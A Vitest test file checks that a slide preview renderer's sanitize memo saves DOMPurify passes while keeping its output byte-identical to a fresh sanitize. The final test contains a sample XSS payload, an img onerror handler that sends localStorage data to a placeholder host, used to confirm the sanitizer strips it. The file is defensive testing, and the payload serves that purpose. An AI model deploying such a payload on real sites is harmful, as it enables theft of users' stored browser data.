// THE SANITIZE MEMO'S CONTRACT — counted, not timed.
//
// `sanitizeSlideHtml` is the largest single item left in a cheap deck's preview render (~4.3ms
// on a 3.3KB prose deck, flat across a 6.5x difference in deck bytes — #1543). `sanitizeOnce` in
// single-slide-render.ts removes it for the case that recurs: sanitizing bytes we already
// sanitized. This counts the DOMPurify passes rather than timing them, for the reason
// preview-work-budget.test.ts gives at length — a wall-clock assertion on this infrastructure is
// the flaky gate `preview-budget.json` argues against, and the saving is a COUNT of passes.
//
// The security half is the point of the last case: a memo hit must be byte-identical to a fresh
// sanitize, or the frame gets a string DOMPurify never approved (HARD RULE #22, #616).

import fs from 'node:fs';
import path from 'node:path';
import { beforeEach, describe, expect, it, vi } from 'vitest';

vi.mock('./render-engine', () => ({ renderMarkdown: vi.fn() }));
vi.mock('./theme-fetch', () => ({
	createThemeFetcher: () => ({ ensure: async () => {}, ensureBase: async () => {}, ensureKatexFaces: async () => {}, katexFacesActive: () => false, fetch: async () => {} }),
}));
vi.mock('../playground/font-embed.js', () => ({ previewFontFaceCss: () => '' }));
// The spy that does the counting: the REAL sanitizer, wrapped. `sanitizeOnce` calls this only on
// a miss, so `mock.calls.length` is exactly the number of DOMPurify passes the preview paid.
vi.mock('./sanitize-slide-html.js', async (importOriginal) => {
	const actual = (await importOriginal()) as typeof import('./sanitize-slide-html.js');
	return { ...actual, sanitizeSlideHtml: vi.fn(actual.sanitizeSlideHtml) };
});

import { renderMarkdown } from './render-engine';
import { sanitizeSlideHtml } from './sanitize-slide-html.js';
import { clearDeckMemo, clearSanitizeMemo, clearSliceCache, createSingleSlideRenderer } from './single-slide-render';

const opts = { themeBase: 'https://x/themes/', runtimeUrl: 'https://x/rt.js' };
const passes = () => (sanitizeSlideHtml as unknown as ReturnType<typeof vi.fn>).mock.calls.length;

/** A plain deck: no deck-derived fact, so every slide takes the slice route. */
const deckOf = (n: number) => Array.from({ length: n }, (_, i) => `# Slide ${i + 1}\n\nBody copy for slide ${i + 1}.\n`).join('\n---\n\n');
const DECK = deckOf(40);
const chunks = DECK.split(/\n-{3,}\n/);
/** Longer than the memo's 128-entry bound, for the eviction cases. */
const LONG_DECK = deckOf(130);

/** One section, and its bytes DEPEND on the source — so two different slides cannot collide. */
const htmlFor = (src: string) =>
	`<article class="lattice"><section class="form" id="1"><div class="cell-stage"><h1>${src.replace(/[<&]/g, '')}</h1></div></section></article>`;

beforeEach(() => {
	class RO {
		observe = vi.fn();
		unobserve = vi.fn();
		disconnect = vi.fn();
	}
	(globalThis as unknown as { ResizeObserver: unknown }).ResizeObserver = RO;
	(window as unknown as { LatticePlayground: unknown }).LatticePlayground = { hasTheme: () => false, addThemes: () => {} };
	(renderMarkdown as unknown as ReturnType<typeof vi.fn>).mockReset();
	(renderMarkdown as unknown as ReturnType<typeof vi.fn>).mockImplementation(async (_pg: unknown, src: string) => ({ html: htmlFor(src), css: '' }));
	(sanitizeSlideHtml as unknown as ReturnType<typeof vi.fn>).mockClear();
	clearDeckMemo();
	clearSliceCache();
	clearSanitizeMemo();
});

function mountHost() {
	const host = document.createElement('figure');
	document.body.appendChild(host);
	return host;
}

/** Show slide `i` of a deck, the way the Studio's editor preview does. */
async function show(r: ReturnType<typeof createSingleSlideRenderer>, host: HTMLElement, i: number, theme?: string, deck = DECK) {
	const parts = deck === DECK ? chunks : deck.split(/\n-{3,}\n/);
	return r.renderInto(host, deck, false, theme, undefined, undefined, undefined, {
		slideIndex: i,
		slideCount: parts.length,
		slideMarkdown: parts[i],
		focused: true,
	});
}

describe('sanitize memo — a repeat render pays no DOMPurify pass', () => {
	it('navigating away and back sanitizes twice, not three times', async () => {
		const r = createSingleSlideRenderer(opts);
		const host = mountHost();
		await show(r, host, 0);
		expect(passes(), 'the first render of a slide must sanitize it').toBe(1);
		await show(r, host, 1);
		expect(passes(), 'a different slide is different bytes — it must be sanitized').toBe(2);
		await show(r, host, 0);
		expect(passes(), 'returning to slide 1 re-sanitized html that had already made the trip').toBe(2);
	});

	it('typing in ANOTHER slide costs no sanitize for the one on screen', async () => {
		// The preview re-renders on every deck change. On the slice route the shown slide's own
		// markdown is unchanged, so the slice cache serves the render — but before this memo that
		// re-render still paid a full DOMPurify pass for a slide nobody had touched.
		const r = createSingleSlideRenderer(opts);
		const host = mountHost();
		await show(r, host, 0);
		expect(passes()).toBe(1);
		await show(r, host, 0, undefined, DECK.replace('Body copy for slide 6.', 'Body copy for slide 6, edited.'));
		expect(passes(), 'an edit to slide 6 re-sanitized slide 1').toBe(1);
	});

	it('a PALETTE flip does not hit — the theme name is in the markup', async () => {
		// This case used to assert the opposite, and passed, because the mocked engine discards the
		// theme argument. The real engine stamps `data-theme` / `--theme` on every section (and dark
		// mode resolves to a different theme name entirely), so a palette change is new bytes and a
		// miss. Asserted here in the shape the real engine produces, so the claim cannot drift back.
		(renderMarkdown as unknown as ReturnType<typeof vi.fn>).mockImplementation(async (_pg: unknown, src: string, theme: string) => ({
			html: htmlFor(src).replace('<section class="form"', `<section data-theme="${theme}" class="form"`),
			css: '',
		}));
		const r = createSingleSlideRenderer(opts);
		const host = mountHost();
		await show(r, host, 3, 'indaco');
		expect(passes()).toBe(1);
		await show(r, host, 3, 'cuoio');
		expect(passes(), 'the palette is stamped into the markup — this MUST be a miss, not a hit').toBe(2);
	});

	it('a keystroke misses by construction — new bytes are new work', async () => {
		// Not a defect of the memo, and the reason the per-call config saving in
		// lib/core/sanitize-slide-html.mjs matters more than this memo does: typing changes the
		// html every time, so this is the one interaction no cache can serve.
		const r = createSingleSlideRenderer(opts);
		const host = mountHost();
		await show(r, host, 0);
		await show(r, host, 0, undefined, DECK.replace('Body copy for slide 1.', 'Body copy for slide 1!'));
		expect(passes(), 'edited html must be sanitized, never served from the memo').toBe(2);
	});

	it('holds a whole deck: 128 slides stay resident, and the 129th evicts the first', async () => {
		// The bound is a DECK, not the slice cache's 24 — the overview grid and a Present walk-back
		// have every slide as their working set, and a sequential scan is what an under-sized LRU
		// serves worst. 128 is the largest deck we ship (119 slides) rounded up. Asserted from BOTH
		// sides so the constant is pinned rather than floored: a smaller bound fails the first
		// assertion, a larger one fails the last.
		const r = createSingleSlideRenderer(opts);
		const host = mountHost();
		for (let i = 0; i < 128; i++) await show(r, host, i, undefined, LONG_DECK);
		expect(passes()).toBe(128);
		await show(r, host, 0, undefined, LONG_DECK);
		expect(passes(), 'a slide from a deck-sized working set was evicted early — the bound is under 128').toBe(128);
		await show(r, host, 128, undefined, LONG_DECK); // the 129th distinct slide
		expect(passes()).toBe(129);
		await show(r, host, 1, undefined, LONG_DECK);
		expect(passes(), 'nothing was evicted by the 129th slide — the memo grows past its bound').toBe(130);
	});

	it('evicts by RECENCY, not arrival — a re-visited slide survives the next eviction', async () => {
		// A plain FIFO passes the bound above, so this pins the LRU half separately. Present walking
		// back and forth is exactly the access pattern that separates them: under FIFO the slide you
		// keep returning to is thrown out on schedule anyway.
		const r = createSingleSlideRenderer(opts);
		const host = mountHost();
		for (let i = 0; i < 128; i++) await show(r, host, i, undefined, LONG_DECK);
		expect(passes()).toBe(128);
		await show(r, host, 0, undefined, LONG_DECK); // a hit — and it must move slide 2 to the front
		expect(passes()).toBe(128);
		await show(r, host, 128, undefined, LONG_DECK); // a miss: something goes, and under LRU it is slide 2
		expect(passes()).toBe(129);
		await show(r, host, 0, undefined, LONG_DECK);
		expect(passes(), 'the re-visited slide was evicted anyway — the memo is a FIFO, not an LRU').toBe(129);
		await show(r, host, 1, undefined, LONG_DECK);
		expect(passes(), 'the least recently used slide should have been the one evicted').toBe(130);
	});

	it('never stores an entry that would cost a deck of them', async () => {
		// Measured slide HTML is 0.7-2.5KB. A slide with a base64-inlined image is not like that, and
		// caching one means evicting most of a deck to serve a single slide — then hashing megabytes
		// on every later lookup. Over an eighth of the budget it is sanitized and handed back, never
		// stored, and the resident set is untouched.
		const r = createSingleSlideRenderer(opts);
		const host = mountHost();
		await show(r, host, 0);
		expect(passes()).toBe(1);
		const huge = `<article class="lattice"><section class="form" id="1"><div class="cell-stage"><p>${'x'.repeat(300_000)}</p></div></section></article>`;
		(renderMarkdown as unknown as ReturnType<typeof vi.fn>).mockImplementation(async () => ({ html: huge, css: '' }));
		await show(r, host, 1);
		await show(r, host, 2);
		expect(passes(), 'the oversized slide was memoized').toBe(3);
		(renderMarkdown as unknown as ReturnType<typeof vi.fn>).mockImplementation(async (_pg: unknown, src: string) => ({ html: htmlFor(src), css: '' }));
		await show(r, host, 0);
		expect(passes(), 'the oversized slide evicted the resident set on its way past').toBe(3);
	});

	it('is bounded by SIZE as well as by count — a deck of heavy slides evicts early', async () => {
		// The count bound alone assumes every entry is slide-sized. These are ~110K code units each,
		// under the per-entry cap but over the total budget between them, so the memo holds fewer
		// than 128 and the oldest goes first.
		const heavy = (src: string) => `<article class="lattice"><section class="form" id="1"><div class="cell-stage"><p>${src.replace(/[<&]/g, '')}${'x'.repeat(110_000)}</p></div></section></article>`;
		(renderMarkdown as unknown as ReturnType<typeof vi.fn>).mockImplementation(async (_pg: unknown, src: string) => ({ html: heavy(src), css: '' }));
		const r = createSingleSlideRenderer(opts);
		const host = mountHost();
		for (let i = 0; i < 12; i++) await show(r, host, i, undefined, LONG_DECK);
		expect(passes()).toBe(12);
		await show(r, host, 0, undefined, LONG_DECK);
		expect(passes(), '12 x ~220K code units is past the 2M budget — the first should have gone').toBe(13);
	});

	it('two renderers share one memo — the overview grid is many hosts on one deck', async () => {
		const a = createSingleSlideRenderer(opts);
		const b = createSingleSlideRenderer(opts);
		await show(a, mountHost(), 5);
		await show(b, mountHost(), 5);
		expect(passes(), 'a second host re-sanitized the tile the first had already done').toBe(1);
	});

	it('CENSUS: three markup sinks, one guard call, and nothing else sanitizes here', () => {
		// WHY A CENSUS AND NOT ONLY A BEHAVIORAL TEST. Before the memo this file named
		// `sanitizeSlideHtml(` at all three sinks; now it names it once, inside `sanitizeOnce`. The
		// #22 gate is a text matcher over the whole file (`SANITIZE_CALL` in tools/check-ownership.js),
		// so it cannot tell three guarded sinks from one guarded sink and two unguarded ones — the
		// same blind spot test/unit/export/style-guard-census.test.js exists for in the stylesheet
		// channel. Pinning the counts makes "a sink stopped routing through the guard" a deliberate
		// edit here, in review, rather than a silent one.
		// Resolved from the working directory rather than `import.meta.url`, which vitest hands back
		// as a non-file URL that `readFileSync` refuses.
		const docsRoot = process.cwd().endsWith('/docs') ? process.cwd() : path.join(process.cwd(), 'docs');
		const src = fs.readFileSync(path.join(docsRoot, 'src/lib/single-slide-render.ts'), 'utf8');
		// Comments mention both names repeatedly, and a mention satisfies the gate — which is
		// precisely the evasion being covered for, so strip them before counting.
		const code = src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
		const sinks = code.match(/sanitizeOnce\s*\(/g)?.length ?? 0;
		expect(sinks - 1, 'the srcdoc write, the patch fast path and the restyle fast path — one call each, plus the definition').toBe(3);
		expect(code.match(/sanitizeSlideHtml\s*\(/g)?.length ?? 0, 'the ONLY sanitizer call in this file is the one inside sanitizeOnce — a sink calling it directly bypasses the memo, and a sink calling neither bypasses HARD RULE #22').toBe(1);
		// The three sinks, named by the statement each one is, so a moved or renamed sink is visible.
		expect(code).toContain('html = sanitizeOnce(html)');
		expect(code.match(/const safe = sanitizeOnce\(out\.html\)/g)?.length ?? 0).toBe(2);
	});

	it('a memo hit is byte-identical to a fresh sanitize (HARD RULE #22)', async () => {
		// The property the whole memo rests on. Driven through the real renderer with a payload
		// engine output could carry, then compared against sanitizing the same string cold.
		const dirty = '<article class="lattice"><section class="form" id="1"><img src=x onerror="fetch(\'//e/?\'+localStorage.k)"><svg><path d="M0 0" vector-effect="non-scaling-stroke"/></svg></section></article>';
		(renderMarkdown as unknown as ReturnType<typeof vi.fn>).mockImplementation(async () => ({ html: dirty, css: '' }));
		const r = createSingleSlideRenderer(opts);
		const host = mountHost();
		await show(r, host, 0);
		const first = host.querySelector('iframe')?.getAttribute('srcdoc') ?? '';
		await show(r, host, 1); // served from the memo — same html, different slide
		const second = host.querySelector('iframe')?.getAttribute('srcdoc') ?? '';
		expect(passes()).toBe(1);
		expect(second).toBe(first);
		expect(second).not.toMatch(/onerror/i);
		expect(second, 'legitimate engine output must survive the memo as it survives the sanitizer').toContain('vector-effect="non-scaling-stroke"');
	});
});
